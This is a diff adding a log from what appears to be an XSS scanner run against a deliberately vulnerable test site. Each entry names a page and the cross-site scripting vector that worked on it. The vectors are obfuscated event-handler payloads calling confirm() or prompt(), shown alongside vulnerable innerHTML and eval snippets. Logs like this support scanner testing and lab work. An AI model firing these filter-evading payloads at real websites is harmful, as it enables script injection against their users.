@@ -1,0 +1,38 @@
+2021-06-28 19:27:17,040 modes.crawl - VULN - Vulnerable webpage: [92mhttps://xss-suite-test-site.herokuapp.com/pages/simple_tag.php[0m
+2021-06-28 19:27:17,041 modes.crawl - VULN - Vector for [92mxss[0m: <a/+/oNpOintEreNtEr+=+[8].find(confirm)>v3dm0s
+2021-06-28 19:27:18,479 modes.crawl - VULN - Vulnerable webpage: [92mhttps://xss-suite-test-site.herokuapp.com/pages/simple_value.php[0m
+2021-06-28 19:27:18,479 modes.crawl - VULN - Vector for [92mxss[0m: "><D3V%09onMOuseOVeR%09=%09confirm()>v3dm0s
+2021-06-28 19:27:19,929 modes.crawl - VULN - Vulnerable webpage: [92mhttps://xss-suite-test-site.herokuapp.com/pages/simple_comment.php[0m
+2021-06-28 19:27:19,929 modes.crawl - VULN - Vector for [92mxss[0m: <d3v%09OnpOinterENtEr%09=%09confirm()>v3dm0s
+2021-06-28 19:27:20,193 core.photon - GOOD - Potentially vulnerable objects found at https://xss-suite-test-site.herokuapp.com/pages/simple_innerHTML.php
+[91m------------------------------------------------------------[0m
+2   var [93mparams[0m = new URLSearchParams(window.[93mlocation.search[0m);
+3   [91mdocument.getElementById('main').innerHTML[0m = params.get('xss');
+[91m------------------------------------------------------------[0m
+2021-06-28 19:27:21,346 core.photon - GOOD - Potentially vulnerable objects found at https://xss-suite-test-site.herokuapp.com/pages/delayed_innerHTML.php
+[91m------------------------------------------------------------[0m
+2   [91msetTimeout[0m(function () {
+3   var [93mparams[0m = new URLSearchParams(window.[93mlocation.search[0m);
+4   [91mdocument.getElementById('main').innerHTML[0m = params.get('xss');
+[91m------------------------------------------------------------[0m
+2021-06-28 19:27:22,547 core.photon - GOOD - Potentially vulnerable objects found at https://xss-suite-test-site.herokuapp.com/pages/simple_innerText.php
+[91m------------------------------------------------------------[0m
+2   var [93mparams[0m = new URLSearchParams(window.[93mlocation.search[0m);
+[91m------------------------------------------------------------[0m
+2021-06-28 19:27:23,721 core.photon - GOOD - Potentially vulnerable objects found at https://xss-suite-test-site.herokuapp.com/pages/simple_eval.php
+[91m------------------------------------------------------------[0m
+2   var [93mparams[0m = new URLSearchParams(window.[93mlocation.search[0m);
+3   document.getElementById('main').innerText = [91meval[0m(params.get('xss'));
+[91m------------------------------------------------------------[0m
+2021-06-28 19:27:25,883 modes.crawl - VULN - Vulnerable webpage: [92mhttps://xss-suite-test-site.herokuapp.com/pages/escaping_tag.php[0m
+2021-06-28 19:27:25,883 modes.crawl - VULN - Vector for [92mxss[0m: <hTML%09OnPOIntERENtER+=+(confirm)()%0dx//
+2021-06-28 19:27:30,134 modes.crawl - VULN - Vulnerable webpage: [92mhttps://xss-suite-test-site.herokuapp.com/pages/escaping_onload.php[0m
+2021-06-28 19:27:30,134 modes.crawl - VULN - Vector for [92mxss[0m: ";a=prompt,a()//\
+2021-06-28 19:27:31,299 modes.crawl - VULN - Vulnerable webpage: [92mhttps://xss-suite-test-site.herokuapp.com/pages/script_single_quote_text.php[0m
+2021-06-28 19:27:31,299 modes.crawl - VULN - Vector for [92mxss[0m: <d3v%0aOnPoINTErEnTeR%0a=%0aconfirm()%0dx//v3dm0s
+2021-06-28 19:27:32,491 modes.crawl - VULN - Vulnerable webpage: [92mhttps://xss-suite-test-site.herokuapp.com/pages/script_double_quote_text.php[0m
+2021-06-28 19:27:32,491 modes.crawl - VULN - Vector for [92mxss[0m: <DeTails%09OnpoinTerentER%0a=%0aconfirm()%0dx>
+2021-06-28 19:27:33,686 modes.crawl - VULN - Vulnerable webpage: [92mhttps://xss-suite-test-site.herokuapp.com/pages/script_backticks_quote_text.php[0m
+2021-06-28 19:27:33,686 modes.crawl - VULN - Vector for [92mxss[0m: <D3v%0aOnMOuseOVER%09=%09(prompt)``%0dx//v3dm0s
+2021-06-28 19:27:34,882 modes.crawl - VULN - Vulnerable webpage: [92mhttps://xss-suite-test-site.herokuapp.com/pages/script_json_encode.php[0m
+2021-06-28 19:27:34,882 modes.crawl - VULN - Vector for [92mxss[0m: <a%0dOnmousEover+=+confirm()%0dx>v3dm0s
